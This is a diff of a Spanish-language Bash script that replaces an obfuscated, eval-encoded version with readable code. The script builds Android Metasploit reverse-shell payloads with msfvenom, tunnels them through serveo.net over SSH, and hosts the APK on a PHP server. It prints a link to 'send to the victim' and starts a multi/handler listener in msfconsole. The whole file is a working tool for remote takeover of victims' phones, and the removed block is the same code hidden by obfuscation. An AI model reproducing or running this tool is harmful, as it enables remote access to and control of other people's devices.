@@ -1,3 +1,191 @@
-z="
-";rDz='\n"';JHz='ink';IJz='Revi';wFz='; th';Yz='LHOS';vDz=' php';KJz='o da';YFz='tKey';TBz='arHa';FHz='rls.';NCz='Escr';lIz=' "us';TGz='=ser';DHz='nien';hDz=' [ -';Wz='~/sh';rHz='_lin';FBz='"';ZGz='/sha';VGz='=$LP';Hz='3[1;';FFz='h $P';SGz='HOST';GHz='p 6';MDz='T ];';DBz='rami';vHz='"htt';JGz='fven';PGz='lear';ZBz='k ];';OFz='rm T';Uz='n='\''\';UGz='net\';xCz='B]$W';bFz='rAli';ECz='LOAD';JFz='vido';OHz='t $P';nDz='cena';wz=' Gra';AJz='t LH';HFz='unel';LCz='$B[$';LJz='tos.';WDz='&& [';WJz='le -';YCz='roid';bz='o.ne';kFz=' ser';hEz='ctad';fEz='1111';JCz='D ];';oHz='ndli';eJz='"$G[';xFz='en';kz='\t'\''';oGz='AD/$';oCz='se_h';bBz='n';rGz='r=$(';fIz='Gray';CDz='p 3';wIz='D $P';AEz='uf -';NJz='by $';RBz=' by ';cCz='/rev';WFz='tric';rz='() {';RFz='ich ';jz='$'\''\n';iBz=' ]; ';gz='efai';bIz='/Gra';WEz='ssh=';cJz='inst';HHz='rm s';vCz='$B"[';JDz='ST &';PDz=' Inv';AGz='OAD/';ADz=' inv';WIz='do p';lBz='exit';KGz='om.l';eBz='send';uFz='/$na';cDz='erto';ZJz='D/Gr';uEz='8';DFz='or';GIz=']\03';cGz=' $(m';Lz='  B=';VCz='case';sHz='k=$(';gEz='Cone';tz=' -e ';DEz='999 ';eCz='_htt';DDz='payl';ABz=' usa';qGz='Cesa';PBz=' Cre';MHz='T:$P';nEz='ual ';iz='IFS=';FGz='sfve';JJz='sand';VIz='otan';cIz='y/$n';gBz='fi';yz=' por';Sz='0m'\''';tHz='grep';jDz='r no';vIz='t PA';GFz='WD/T';yFz='PAYL';tIz='rc';TJz='....';SCz='alid';wDz='..\n';CEz='11-9';KCz=' do';GDz=' LHO';MIz='ma =';jJz='jecu';QGz='$Gre';oIz='t/mu';aEz='ORT1';WCz='D in';lz='trap';TFz='-c '\''';HDz='ST {';Fz='  G=';rIz='ler"';pGz='name';pJz=' 2';eEz=' -i ';XJz='q -r';EEz='-n 1';MJz='ted ';BFz='l/se';bJz='.rc';XIz='ad .';tFz='/PAY';BEz='i 11';qIz='hand';hBz='/TCP';UCz='done';XCz='"and';BJz='OST ';EIz='[1;3';dz='set ';aJz='ay/$';qDz='s...';qHz=' &';MCz='R*$B';nIz='ploi';PFz='CP';NDz='Erro';qFz='2>&1';Jz='Y='\''\';ZDz=']; d';LBz='t.me';SFz='sh) ';vBz='Payl';mIz='e ex';aGz='dow/';VBz='if [';KBz='s://';Kz='1;33';fBz='link';dCz='erse';TIz='p 5';fFz='0 -R';UHz='&';CCz='=> "';CGz='e';ZHz='a =$';hCz=';;';XGz='en R';MGz='oas.';iDz='z $n';RHz='v/nu';mGz='WD/P';lJz=' bas';sCz='se_t';gHz=' 80:';RGz='en L';ZCz='/met';sIz=' >> ';SEz='-i 1';JEz='n"';jFz='RT1'\''';sGz='1-6 ';kCz='")';XBz='/sen';yEz='ay\n';xz='cias';HCz=' $PA';XEz='Chec';qEz='rm -';GCz='[ -z';az='erve';EBz='enta';Rz='W='\''\';aFz='=no ';hFz=''\'':'\''$';KEz='p 1';NGz='p 4';NIz='[32m';RDz='T12';iJz='ro e';iHz='OST'\''';gFz=' '\''$L';XHz='a vi';IGz='l/ms';KHz='php ';yGz='$R"';RIz='d_li';jBz='then';eDz='re"';qz='tion';QFz='$(wh';oz='2';mBz=' 3';bHz='tp:/';jHz=':'\''$P';jGz='RT=$';rFz=' '\'' &';oBz=' pay';OEz='uale';SHz='ll 2';Pz='  C=';QIz='$sen';EHz='do u';kJz='ta$C';SIz='nk/$';qCz=')';oDz='ndo ';XFz='tHos';nz='l_c ';BHz='do .';rCz='ttps';Ez='    ';sz='echo';UEz=' -n ';RCz='ad v';wHz='ps:/';BIz='et" ';WHz='a al';Cz='1;31';VHz='Envi';QHz=' /de';pBz='load';jCz='_tcp';LDz='-z $';aHz='n ht';bDz='r pu';dIz='ame.';DIz='\033';MEz='tos ';fDz=' nam';kHz='HP'\'' ';pz='func';OCz='ibe ';nCz='ever';PCz='un p';xIz='AD" ';fJz=' Err';CJz='ST" ';THz='>&1 ';gCz='T';nGz='AYLO';mHz='et 2';EDz='oad';tCz='cp")';yDz='$(sh';LIz='icti';eIz='rc ]';LHz='-S $';yBz='e re';Mz='34m'\''';Zz='T1=s';Gz=''\''\03';KIz='la v';aIz='er .';QBz='ated';UBz='ckGr';RJz='Expl';uDz='idor';VDz='RT1 ';YEz='ando';LGz='og';FJz='RT1"';EFz='touc';jIz='ray/';MFz=']; t';QCz='aylo';LFz='TCP ';IEz='...\';Oz='1;35';dDz='Nomb';uCz='*)';CIz='tf '\''';pHz='nk '\''';uBz=']$W ';OJz='ay &';JBz='http';iEz='o a ';mJz='h in';mFz='net ';TDz='RT12';uHz=' -o ';pDz='dato';Dz='m'\''  ';ICz='YLOA';IFz='/ser';nBz='}';wBz='oad"';Az='R='\''\';NEz='virt';ODz='r IP';LEz='puer';UDz=' {';sDz='Crea';HEz='ado.';VEz='1)';bGz='e$Y"';NBz='arGr';cEz='T=$(';kEz='ST..';aDz='o';UJz='msfc';eGz='-p $';uIz=' "se';VFz='-o S';cFz='veIn';KDz='& [ ';hIz='c';nHz='> se';dHz='OST:';hGz='rveo';lCz='/she';Iz='32m'\''';IDz='T"';EGz='el/m';mDz='Alma';vFz='me ]';fCz='p")';rBz='prin';iIz='WD/G';FCz=' && ';SBz='@Ces';lDz='o "';dFz='terv';tGz='-n1)';gGz='T=se';XDz=' -z ';PEz='s..\';YJz=' $PW';GJz=' "ex';HJz='t" >';IIz=' Env';HGz='log ';SJz='oit.';fGz='OAD ';pFz='ull ';ZFz='king';YIz='do h';CBz=' her';Bz='033[';xEz='me $';jEz='$LHO';iCz='ps")';qBz='  {';BCz='p " ';NHz='HP -';tBz='$B[*';DGz='/Tun';nJz='stal';WGz='ORT\';DCz=' PAY';fz=' pip';HIz='3[0m';gJz='or p';YBz='dlin';QEz='=$(s';FDz='esac';yHz='9a-z';iFz='T'\'':'\''';UIz='expl';mCz='ll/r';UFz='ssh ';REz='huf ';kIz='e.rc';BBz='r mi';BGz='$nam';CFz='rvid';PJz=' Mic';cBz='rm $';kBz='TCP';cz='t';uGz='bash';aCz='erpr';wCz='$R!$';dGz='nom ';FEz='Serv';lHz='eo.n';GEz=' cre';BDz='slee';uz='"$B[';ZIz='andl';vz='*]$W';PIz='\n'\'' ';kGz='T R ';pCz='ttp"';mz=' ctr';EJz='ORT ';QJz='key\';ZEz=' $LP';gIz='me.r';oEz='T $L';oJz='l$W"';nFz='> /d';hHz=''\''$LH';sBz='tf "';dJz='all ';sEz='eo';hz='l';kDz='mbre';xHz='/[0-';GGz='nom.';AFz='Tune';dBz='PWD/';AIz=']*\.';pEz='PORT';Xz='adow';lGz='> $P';Tz='Gree';YDz='$LPO';eFz='al=6';hJz='rime';YHz='ctim';TEz='1-99';tEz='p 0.';wGz='"$Ce';OIz=' %s ';sFz='p 10';oFz='ev/n';JIz='ia a';VJz='onso';vEz='Cont';Nz='M='\''\';yCz=' Pay';OGz=' $(c';TCz='o"';QDz='LPOR';HBz='tact';bCz='eter';ACz='ad -';IBz='ame ';CHz='Obte';aBz=' the';FIz='4m[*';NFz='hen';Vz='PWD=';fHz='me$W';bEz='p 2';dEz='shuf';xDz='PHP=';cHz='/$LH';KFz='r';IHz='endl';xGz='sar';OBz='ay"';rEz='rf $';yIz='>> $';mEz='Virt';xBz='whil';eHz='$PHP';PHz='AD >';YGz=' > ~';lFz='veo.';GBz=' Con';DJz='t LP';gDz='e &&';AHz='oad ';tDz='serv';vGz=' "$P';Qz='36m'\''';ez='-euo';WBz='$PWD';pIz='lti/';wEz='acta';iGz='.net';SDz=' LPO';MBz='/Ces';lEz='.\n"';
-eval "$Az$Bz$Cz$Dz$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Fz$Gz$Hz$Iz$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Jz$Bz$Kz$Dz$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Lz$Gz$Hz$Mz$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Nz$Bz$Oz$Dz$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Ez$Pz$Gz$Hz$Qz$z$Rz$Bz$Sz$z$Tz$Uz$Bz$Iz$z$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$z$dz$ez$fz$gz$hz$z$iz$jz$kz$z$lz$mz$nz$oz$z$pz$qz$mz$nz$rz$z$sz$z$sz$z$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$z$sz$tz$uz$vz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$z$sz$tz$uz$vz$PBz$QBz$RBz$SBz$TBz$UBz$OBz$z$sz$z$VBz$tz$WBz$XBz$YBz$ZBz$aBz$bBz$z$cBz$dBz$eBz$fBz$z$gBz$z$VBz$tz$WBz$hBz$iBz$jBz$z$cBz$dBz$kBz$z$gBz$z$lBz$mBz$z$nBz$z$pz$qz$oBz$pBz$qBz$z$rBz$sBz$tBz$uBz$vBz$wBz$z$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$z$rBz$sBz$LCz$MCz$uBz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$z$UCz$z$VCz$HCz$ICz$WCz$z$XCz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$z$Yz$gCz$z$hCz$z$XCz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$iCz$z$Yz$gCz$z$hCz$z$XCz$YCz$ZCz$aCz$bCz$cCz$dCz$jCz$kCz$z$Yz$gCz$z$hCz$z$XCz$YCz$lCz$mCz$nCz$oCz$pCz$qCz$z$Yz$gCz$z$hCz$z$XCz$YCz$lCz$mCz$nCz$oCz$rCz$kCz$z$Yz$gCz$z$hCz$z$XCz$YCz$lCz$mCz$nCz$sCz$tCz$z$Yz$gCz$z$hCz$z$uCz$z$sz$tz$vCz$wCz$xCz$yCz$pBz$ADz$SCz$TCz$z$BDz$CDz$z$DDz$EDz$z$hCz$z$FDz$z$nBz$z$pz$qz$GDz$HDz$z$rBz$sBz$tBz$uBz$Yz$IDz$z$xBz$yBz$ACz$BCz$CCz$GDz$JDz$KDz$LDz$Yz$MDz$KCz$z$rBz$sBz$LCz$MCz$uBz$NDz$ODz$PDz$SCz$TCz$z$UCz$z$QDz$RDz$z$nBz$z$pz$qz$SDz$TDz$UDz$z$rBz$sBz$tBz$uBz$QDz$IDz$z$xBz$yBz$ACz$BCz$CCz$SDz$VDz$WDz$XDz$YDz$VDz$ZDz$aDz$z$rBz$sBz$LCz$MCz$uBz$NDz$bDz$cDz$PDz$SCz$TCz$z$UCz$z$rBz$sBz$tBz$uBz$dDz$eDz$z$xBz$yBz$ACz$BCz$CCz$fDz$gDz$hDz$iDz$IBz$ZDz$aDz$z$rBz$sBz$LCz$MCz$uBz$NDz$jDz$kDz$ADz$SCz$lDz$z$UCz$z$rBz$sBz$tBz$uBz$mDz$nDz$oDz$pDz$qDz$rDz$z$BDz$CDz$z$rBz$sBz$tBz$uBz$sDz$oDz$tDz$uDz$vDz$wDz$FBz$z$BDz$CDz$z$xDz$yDz$AEz$BEz$CEz$DEz$EEz$qCz$z$rBz$sBz$tBz$uBz$FEz$uDz$GEz$HEz$IEz$JEz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$sDz$oDz$LEz$MEz$NEz$OEz$PEz$JEz$z$BDz$CDz$z$tDz$uDz$QEz$REz$SEz$TEz$UEz$VEz$z$WEz$yDz$AEz$BEz$CEz$DEz$EEz$qCz$z$rBz$sBz$tBz$uBz$XEz$YEz$ZEz$aEz$wDz$FBz$z$BDz$bEz$z$QDz$cEz$dEz$eEz$fEz$TEz$DEz$EEz$qCz$z$rBz$sBz$tBz$uBz$gEz$hEz$iEz$jEz$kEz$lEz$z$BDz$CDz$z$rBz$sBz$tBz$uBz$mEz$nEz$QDz$oEz$pEz$wDz$FBz$z$BDz$CDz$z$qEz$rEz$dBz$tDz$sEz$z$rBz$sBz$tBz$uBz$XEz$YEz$IEz$JEz$z$BDz$tEz$uEz$z$rBz$sBz$tBz$uBz$vEz$wEz$xEz$Tz$JEz$z$BDz$bEz$z$rBz$sBz$JBz$KBz$LBz$MBz$NBz$yEz$FBz$z$BDz$bEz$z$qEz$rEz$dBz$AFz$BFz$CFz$DFz$z$EFz$FFz$GFz$HFz$IFz$JFz$KFz$z$VBz$tz$LFz$MFz$NFz$z$OFz$PFz$z$gBz$z$QFz$RFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$XEz$ZFz$aFz$VFz$az$bFz$cFz$dFz$eFz$fFz$gFz$pEz$hFz$Yz$iFz$YDz$jFz$kFz$lFz$mFz$nFz$oFz$pFz$qFz$rFz$z$BDz$sFz$z$VBz$tz$WBz$tFz$ECz$uFz$vFz$wFz$xFz$z$cBz$dBz$yFz$AGz$BGz$CGz$z$gBz$z$VBz$tz$WBz$DGz$EGz$FGz$GGz$HGz$MFz$NFz$z$cBz$dBz$AFz$IGz$JGz$KGz$LGz$z$gBz$z$rBz$sBz$tBz$uBz$sDz$oDz$DDz$MGz$lEz$z$BDz$NGz$z$sz$OGz$PGz$qCz$z$sz$z$sz$z$sz$z$rBz$sBz$QGz$RGz$SGz$TGz$lFz$UGz$JEz$z$rBz$sBz$QGz$RGz$pEz$VGz$WGz$JEz$z$rBz$sBz$QGz$XGz$YGz$ZGz$aGz$yFz$AGz$BGz$bGz$z$sz$z$sz$z$sz$cGz$FGz$dGz$eGz$yFz$fGz$Yz$gGz$hGz$iGz$SDz$jGz$QDz$kGz$lGz$mGz$nGz$oGz$pGz$qCz$z$sz$z$sz$z$sz$z$sz$z$sz$z$sz$OGz$PGz$qCz$z$qGz$rGz$dEz$eEz$sGz$tGz$z$uGz$vGz$GFz$HFz$ZGz$aGz$wGz$xGz$z$sz$z$sz$z$rBz$sBz$yGz$z$sz$z$sz$z$rBz$sBz$tBz$uBz$vBz$AHz$sDz$BHz$wDz$FBz$z$BDz$CDz$z$rBz$sBz$tBz$uBz$mDz$nDz$oDz$pDz$qDz$rDz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$sDz$oDz$tDz$uDz$vDz$wDz$FBz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$FEz$uDz$GEz$HEz$IEz$JEz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$sDz$oDz$LEz$MEz$NEz$OEz$PEz$JEz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$XEz$YEz$ZEz$aEz$wDz$FBz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$gEz$hEz$iEz$jEz$kEz$lEz$z$BDz$KEz$z$rBz$sBz$tBz$uBz$CHz$DHz$EHz$FHz$wDz$FBz$z$BDz$GHz$z$VBz$tz$eBz$fBz$iBz$jBz$z$HHz$IHz$JHz$z$gBz$z$KHz$LHz$Yz$MHz$NHz$OHz$mGz$nGz$PHz$QHz$RHz$SHz$THz$UHz$z$rBz$sBz$tBz$uBz$VHz$WHz$XHz$YHz$ZHz$Tz$aHz$bHz$cHz$dHz$eHz$uFz$fHz$rDz$z$QFz$RFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$XEz$ZFz$aFz$VFz$az$bFz$cFz$dFz$eFz$fFz$gHz$hHz$iHz$jHz$kHz$tDz$lHz$mHz$nFz$oFz$pFz$nHz$oHz$pHz$qHz$z$BDz$sFz$z$eBz$rHz$sHz$tHz$uHz$vHz$wHz$xHz$yHz$AIz$tDz$lHz$BIz$eBz$fBz$qCz$z$rBz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$JIz$KIz$LIz$MIz$DIz$NIz$OIz$PIz$QIz$RIz$SIz$pGz$z$BDz$TIz$z$rBz$sBz$tBz$uBz$UIz$VIz$WIz$QCz$XIz$lEz$z$BDz$CDz$z$rBz$sBz$tBz$uBz$UIz$VIz$YIz$ZIz$aIz$wDz$FBz$z$BDz$CDz$z$VBz$tz$WBz$bIz$cIz$dIz$eIz$wFz$xFz$z$cBz$dBz$fIz$uFz$gIz$hIz$z$gBz$z$EFz$FFz$iIz$jIz$BGz$kIz$z$sz$lIz$mIz$nIz$oIz$pIz$qIz$rIz$sIz$WBz$bIz$cIz$dIz$tIz$z$sz$uIz$vIz$ICz$wIz$nGz$xIz$yIz$dBz$fIz$uFz$gIz$hIz$z$sz$uIz$AJz$BJz$jEz$CJz$yIz$dBz$fIz$uFz$gIz$hIz$z$sz$uIz$DJz$EJz$YDz$FJz$sIz$WBz$bIz$cIz$dIz$tIz$z$sz$GJz$nIz$HJz$lGz$iIz$jIz$BGz$kIz$z$rBz$sBz$tBz$uBz$IJz$JJz$KJz$LJz$wDz$FBz$z$BDz$NGz$z$rBz$sBz$tBz$uBz$sDz$MJz$NJz$Tz$JEz$z$BDz$CDz$z$rBz$sBz$SBz$TBz$UBz$OJz$PJz$QJz$JEz$z$BDz$bEz$z$rBz$sBz$tBz$uBz$RJz$SJz$TJz$rDz$z$BDz$bEz$z$UJz$VJz$WJz$XJz$YJz$ZJz$aJz$pGz$bJz$z$nBz$z$VBz$tz$cJz$dJz$MFz$NFz$z$sz$z$BDz$CDz$z$sz$tz$eJz$vz$fJz$gJz$hJz$iJz$jJz$kJz$lJz$mJz$nJz$oJz$z$sz$z$BDz$bEz$z$lBz$pJz$z$gBz$z$DDz$EDz"
+R='\033[1;31m'                                                        G='\033[1;32m'                                                        Y='\033[1;33m'                                                        B='\033[1;34m'                                                        M='\033[1;35m'                                                        C='\033[1;36m'
+W='\033[0m'
+Green='\033[32m'
+PWD=~/shadow
+LHOST1=serveo.net
+set -euo pipefail
+IFS=$'\n\t'
+trap ctrl_c 2
+function ctrl_c () {
+echo
+echo
+echo -e "$B[*]$W Gracias por usar mi herramienta"
+echo -e "$B[*]$W Contactame https://t.me/CesarGray"
+echo -e "$B[*]$W Created by @CesarHackGray"
+echo
+if [ -e $PWD/sendlink ]; then
+rm $PWD/sendlink
+fi
+if [ -e $PWD/TCP ]; then
+rm $PWD/TCP
+fi
+exit 3
+}
+function payload  {
+printf "$B[*]$W Payload"
+while read -p " => " PAYLOAD && [ -z $PAYLOAD ]; do
+printf "$B[$R*$B]$W Escribe un payload valido"
+done
+case $PAYLOAD in
+"android/meterpreter/reverse_http")
+LHOST
+;;
+"android/meterpreter/reverse_https")
+LHOST
+;;
+"android/meterpreter/reverse_tcp")
+LHOST
+;;
+"android/shell/reverse_http")
+LHOST
+;;
+"android/shell/reverse_https")
+LHOST
+;;
+"android/shell/reverse_tcp")
+LHOST
+;;
+*)
+echo -e $B"[$R!$B]$W Payload invalido"
+sleep 3
+payload
+;;
+esac
+}
+function LHOST {
+printf "$B[*]$W LHOST"
+while read -p " => " LHOST && [ -z $LHOST ]; do
+printf "$B[$R*$B]$W Error IP Invalido"
+done
+LPORT12
+}
+function LPORT12 {
+printf "$B[*]$W LPORT"
+while read -p " => " LPORT1 && [ -z $LPORT1 ]; do
+printf "$B[$R*$B]$W Error puerto Invalido"
+done
+printf "$B[*]$W Nombre"
+while read -p " => " name && [ -z $name ]; do
+printf "$B[$R*$B]$W Error nombre invalido "
+done
+printf "$B[*]$W Almacenando datos...\n"
+sleep 3
+printf "$B[*]$W Creando servidor php..\n"
+sleep 3
+PHP=$(shuf -i 1111-9999 -n 1)
+printf "$B[*]$W Servidor creado....\n"
+sleep 1
+printf "$B[*]$W Creando puertos virtuales..\n"
+sleep 3
+servidor=$(shuf -i 11-99 -n 1)
+ssh=$(shuf -i 1111-9999 -n 1)
+printf "$B[*]$W Checando $LPORT1..\n"
+sleep 2
+LPORT=$(shuf -i 11111-99999 -n 1)
+printf "$B[*]$W Conectado a $LHOST...\n"
+sleep 3
+printf "$B[*]$W Virtual LPORT $LPORT..\n"
+sleep 3
+rm -rf $PWD/serveo
+printf "$B[*]$W Checando...\n"
+sleep 0.8
+printf "$B[*]$W Contactame $Green"
+sleep 2
+printf "https://t.me/CesarGray\n"
+sleep 2
+rm -rf $PWD/Tunel/servidor
+touch $PWD/Tunel/servidor
+if [ -e TCP ]; then
+rm TCP
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$LPORT':'$LHOST':'$LPORT1' serveo.net > /dev/null 2>&1 ' &
+sleep 10
+if [ -e $PWD/PAYLOAD/$name ]; then
+rm $PWD/PAYLOAD/$name
+fi
+if [ -e $PWD/Tunel/msfvenom.log ]; then
+rm $PWD/Tunel/msfvenom.log
+fi
+printf "$B[*]$W Creando payloas..\n"
+sleep 4
+echo $(clear)
+echo
+echo
+echo
+printf "$Green LHOST=serveo.net\n"
+printf "$Green LPORT=$LPORT\n"
+printf "$Green R > ~/shadow/PAYLOAD/$name$Y"
+echo
+echo
+echo $(msfvenom -p $PAYLOAD LHOST=serveo.net LPORT=$LPORT R > $PWD/PAYLOAD/$name)
+echo
+echo
+echo
+echo
+echo
+echo $(clear)
+Cesar=$(shuf -i 1-6 -n1)
+bash "$PWD/Tunel/shadow/"$Cesar
+echo
+echo
+printf "$R"
+echo
+echo
+printf "$B[*]$W Payload Creado ...\n"
+sleep 3
+printf "$B[*]$W Almacenando datos...\n"
+sleep 1
+printf "$B[*]$W Creando servidor php..\n"
+sleep 1
+printf "$B[*]$W Servidor creado....\n"
+sleep 1
+printf "$B[*]$W Creando puertos virtuales..\n"
+sleep 1
+printf "$B[*]$W Checando $LPORT1..\n"
+sleep 1
+printf "$B[*]$W Conectado a $LHOST...\n"
+sleep 1
+printf "$B[*]$W Obteniendo urls...\n"
+sleep 6
+if [ -e sendlink ]; then
+rm sendlink
+fi
+php -S $LHOST:$PHP -t $PWD/PAYLOAD > /dev/null 2>&1 &
+printf "$B[*]$W Envia ala victima =$Green http://$LHOST:$PHP/$name$W\n"
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:'$LHOST':'$PHP' serveo.net 2> /dev/null > sendlink ' &
+sleep 10
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\033[1;34m[*]\033[0m Envia ala victima =\033[32m %s \n' $send_link/$name
+sleep 5
+printf "$B[*]$W explotando payload ..\n"
+sleep 3
+printf "$B[*]$W explotando handler ...\n"
+sleep 3
+if [ -e $PWD/Gray/$name.rc ]; then
+rm $PWD/Gray/$name.rc
+fi
+touch $PWD/Gray/$name.rc
+echo "use exploit/multi/handler" >> $PWD/Gray/$name.rc
+echo "set PAYLOAD $PAYLOAD" >> $PWD/Gray/$name.rc
+echo "set LHOST $LHOST" >> $PWD/Gray/$name.rc
+echo "set LPORT $LPORT1" >> $PWD/Gray/$name.rc
+echo "exploit" >> $PWD/Gray/$name.rc
+printf "$B[*]$W Revisando datos...\n"
+sleep 4
+printf "$B[*]$W Created by $Green"
+sleep 3
+printf "@CesarHackGray & Mickey\n"
+sleep 2
+printf "$B[*]$W Exploit.....\n"
+sleep 2
+msfconsole -q -r $PWD/Gray/$name.rc
+}
+if [ -e install ]; then
+echo
+sleep 3
+echo -e "$G[*]$W Error primero ejecuta$C bash install$W"
+echo
+sleep 2
+exit 2
+fi
+payload
